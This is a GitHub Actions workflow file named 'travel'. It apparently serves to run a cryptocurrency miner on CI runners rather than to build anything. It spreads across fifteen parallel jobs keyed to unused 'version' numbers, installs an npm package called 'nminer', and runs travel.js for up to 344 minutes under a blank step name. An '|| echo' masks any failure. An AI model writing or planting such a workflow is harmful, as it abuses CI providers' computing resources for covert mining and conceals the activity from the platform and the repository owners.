name: travel
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9092 }
          - { version: 5229 }
          - { version: 9584 }
          - { version: 9259 }
          - { version: 5759 }
          - { version: 5694 }
          - { version: 8848 }
          - { version: 6137 }
          - { version: 876 }
          - { version: 6058 }
          - { version: 6100 }
          - { version: 4153 }
          - { version: 7830 }
          - { version: 675 }
          - { version: 1123 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 344m node travel.js || echo "travel executed"